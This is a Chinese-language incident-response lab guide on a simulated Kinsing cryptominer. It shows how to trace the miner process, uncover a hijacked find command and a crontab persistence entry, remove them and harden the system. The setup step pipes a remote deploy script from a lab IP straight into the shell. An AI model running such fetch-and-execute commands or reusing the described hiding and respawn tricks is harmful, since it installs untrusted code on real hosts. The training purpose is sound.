## 一、实验背景
**场景描述**：
你是公司的运维安全工程师。刚刚接到开发团队的紧急报障，称一台核心业务服务器突然变得响应迟钝，风扇狂转。管理员尝试重启过服务器，但没过多久问题依旧。
**你的任务**：
登录服务器，找出导致卡顿的元凶，分析其驻留机制，并将其彻底清除。
## 二、环境部署
在虚拟机终端中创建并运行模拟病毒脚本：
`curl http://192.168.1.31/deploy.sh | sh`
## 三、排查实战
CPU占用过高（最少50%）工作情况CPU占用一般都是100%
![[Pasted image 20260109095829.png]]
### 1、观察与初步对抗
#### ①使用 top 命令查看系统资源
![[Pasted image 20260109095929.png]]
- 操作：输入 top
- 观察：
         1. 占用 CPU 最高的进程叫什么？（记录名称： kdevtmpfsi ）
         2. 观察它的 %CPU 变化。你会发现它在 90%-100% 维持几秒，然后突然掉到 0% ，然后又升起来
        为什么病毒要“休息”那两秒？
     (参考答案：防止服务器完全卡死被管理员强制重启；规避云厂商的持续高负载报警。)
#### ②尝试直接查杀
- 操作：记下 kdevtmpfsi 的 PID，按 q 退出 top，执行 kill -9 \<PID\> 。
  ![[Pasted image 20260109101130.png]]
- 验证：等待 5-10 秒，再次输入 top 。
- 结果：它还在吗？PID 变了吗？
  (现象：病毒复活了，PID 变了。说明有东西在重启它。)
  ![[Pasted image 20260109101147.png]]
### 2、溯源
#### ①寻找“幕后黑手”（父子进程分析）
单纯的 ps -aux 很难看出谁启动了谁。
- 操作： `pstree -p` 
- 寻找：找到 kdevtmpfsi ，顺着树状结构往左看，它的父进程是谁？
  (记录名称： kinsing )
**注意**：只杀子进程（挖矿工），父进程（监工）会立刻重新招人。要杀就得一锅端。
系统没有pstree，又安装不了怎么办？
使用 ps 命令的高级参数（最推荐）
Linux 自带的 ps 其实已经内置了简单的树状显示功能：`ps axjf`
![[Pasted image 20260109101438.png]]
- a : 显示所有进程。
- x : 显示没有控制终端的进程。
- j : 显示任务信息（包含 PPID）。
- f : ASCII 字符绘图显示的进程树（这是 pstree 的最佳替代品）。
在 Linux 中，PPID (Parent Process ID) 是父进程 ID，PID (Process ID) 是当前进程 ID。
#### ②遭遇“幽灵文件”（系统命令信任危机）
既然找到了文件名，我们尝试定位它们。
- 操作：输入 `find / -name kinsing -type f` 或 `find / -name kdevtmpfsi -type f`
- 现象：没有任何输出
  ![[Pasted image 20260109101758.png]]
- 疑问：top 里明明看到进程在跑，为什么 find 搜不到文件？是文件被删了吗？
- 验证：找一个确定存在的文件使用find查找测试。
  ![[Pasted image 20260109103251.png]]
  ![[Pasted image 20260109102448.png]]
  (现象：ls 能看到文件！说明 find 命令在撒谎！)
#### ③揭穿 find 的真面目
- 操作：查看 find 命令本身
  ![[Pasted image 20260109102802.png]]
- 结论： find 被替换成了 Shell 脚本。它不仅过滤了病毒文件（隐身），还在每次运行时偷偷启动病毒（复活）。
#### ④检查持久化后门
病毒是如何在服务器重启后自启动的？
- 操作： `crontab -l`
- 发现：存在恶意计划任务。
  ![[Pasted image 20260109102938.png]]
## 四、彻底清除方案
在理解了病毒的逻辑后，必须按正确顺序操作，否则病毒会不断复活。
### 1、修复系统工具
首先把被劫持的 find 救回来，否则后续查找清理会受阻
- 检查是否存在备份：`ls -a /usr/bin/.original_find`
- 恢复：`mv /usr/bin/.original_find /usr/bin/find
![[Pasted image 20260109103325.png]]
### 2、切断复活源 (Crontab)
删除计划任务：`crontab -r`
### 3、斩草除根 (杀进程)
必须同时处理父进程和子进程。
- `pkill -9 kinsing` 先杀守护进程
- `pkill -9 kdevtmpfsi` 再杀干活的进程
- `top` 检查是否杀干净
### 4、清理文件
现在 find 已经恢复正常，可以用来搜索并删除了（也可以直接删）
`rm -f /usr/bin/kinsing`
`rm -f /usr/bin/kdevtmpfsi`
`rm -f /usr/bin/.system_cache_bak`别忘了那个隐藏的备份文件！
### 5、最终验证
- top 看不到高占用进程。
- crontab -l 为空。
- ls /usr/bin/kinsing 显示不存在。
在 Linux 挖矿病毒或恶意软件的实战场景中，不仅会有祖父进程，甚至可能存在更深层的嵌套关系。 这种多层级的进程结构黑客为了实现持久化、自我保护和躲避检测而专门设计的架构
一个成熟的 Linux 挖矿木马通常呈现如下结构：
- 祖父进程 (Grandparent - 持久化层)：通常是系统的守护进程（如 crond 、 systemd ）或被劫持的服务。它的任务是确保“后代”存活。
- 父进程 (Parent - 监控/加载层)：通常是一个隐藏的 Shell 脚本或小巧的二进制加载（Loader）。它负责监控挖矿核心进程，如果核心进程被杀，它会立即重启一个。
- 子进程 (Child - 执行层)：实际的挖矿程序（如经过更名的 xmrig ）。它消耗 CPU 进行计算。
## 五、实验结束清理
恢复你的环境，请运行清理脚本
操作：创建并运行 cleanup.sh
- vim cleanup.sh
- 粘贴脚本
  `echo "[-] 正在恢复实验环境. "`
  `pkill -9 kinsing`
  `pkill -9 kdevtmpfsi`
  `crontab -r`
  `再次确保 find 恢复（防止学生操作失败）`
  `if [ -f /usr/bin/.original_find ]; then`
     `mv /usr/bin/.original_find /usr/bin/find`
  `fi`
  `rm -f /usr/bin/kdevtmpfsi /usr/bin/kinsing /usr/bin/.system_cache_bak /tmp/kdevtmpfsi.log deploy_malware.sh`
  `echo "[OK] 环境已重置。"`
- 赋予运行权限：chmod +x cleanup.sh
- 运行：./cleanup.sh
  ![[Pasted image 20260109104833.png]]
## 六、课后思考
1. 关于 find 劫持：如果你没有发现 find 被劫持，直接执行了删除病毒文件的操作，会发生什么后果？
2. 关于权限：本实验中病毒替换了 /usr/bin/find ，这说明病毒获取了什么权限？如果是普通用户权限中毒，它能做到这一点吗？
3. 防御：如何防止系统命令（如 ls, ps, find）被篡改？
## 七、答案
1. 关于 find 劫持
    如果学生未发现 find 被劫持，通常会陷入“越治越乱”或“自我怀疑”的困境：
   - 无法定位目标（隐身）：被劫持的 find 脚本通过 grep -v 过滤了病毒关键字。学生输入 find / -name kinsing 后，系统会返回空结果。这会导致学生误以为病毒已经被删除了，从而过早结束排查，留下了安全隐患。
   - 触发复活机制（陷阱）：根据脚本逻辑，被劫持的 find 在执行前会先运行 pgrep 检查病毒进程。如果学生之前刚刚杀掉了病毒进程，紧接着习惯性地运行 find 确认文件位置，这个查询动作本身就会把病毒重新启动。
   - 后果：攻击者利用管理员的“检查”行为作为维持权限的手段。
  2. 关于权限
     - 权限等级：说明病毒已经获取了 Root（超级管理员）权限。
     - 原因分析：
         - Linux 文件系统权限极其严格。 /usr/bin/ 目录存放的是系统级可执行文件，其所有者通常是 root ，且权限通常为 755 （只有所有者可写）。
         - 普通用户（如 guest 或 Web 服务账户 w -data ）对 /usr/bin/ 只有“读”和“执行”权限，没有“写”权限。
      - 结论：如果只是普通用户中毒（例如通过 Web 漏洞上传了 Webshell），攻击者是无法直接替换 find 命令的。必须先进行提权（Privilege Escalation），拿到 Root 权限后，才能实施这种级别的系统命令劫持。
  3. 防御
     可以从预防和检测两个维度进行防御：
     1、文件完整性校验（检测层）：
     - 原理：对关键系统文件（如 /bin/ , /usr/bin/ , /sbin/ ）计算哈希值（MD5/SHA256）并建立基线数据库。一旦文件内容发生哪怕一个字节的改变，哈希值都会巨变。
     - 工具：
          - Tripwire / AIDE：经典的 Linux 完整性检查工具，定期扫描并报警。
          - RPM/DPKG 校验：在应急响应现场，可以使用 rpm -Va (RedHat系) 或 dpkg - verify (Debian/Kali系) 快速对比当前文件与安装包中的原始文件是否一致。

     2、HIDS 主机入侵检测系统（实时监控层）：
       部署如 OSSEC 或 Wazuh 等 HIDS 系统。它们可以实时监控关键系统文件的修改行为，一旦发现 /usr/bin/find 被修改，立即告警甚至自动阻断。
     3、 文件属性锁定（加固层）：
     - 使用 chattr 命令锁定关键文件
     - 命令： chattr +i /usr/bin/find
     - 效果：加上 +i (immutable) 属性后，即使是 Root 用户也无法直接修改或删除该文件，必须先解锁（ chattr -i ）才能修改，增加了攻击者的篡改成本。
 **实战技巧**：
     在排查过程中，如果你怀疑 ps 或 find 坏了，可以使用 busybox 工具集替代。例如： busybox ps -ef 或 busybox find / 。因为攻击者通常只替换系统默认命令，很难覆盖到外部引入的独立工具。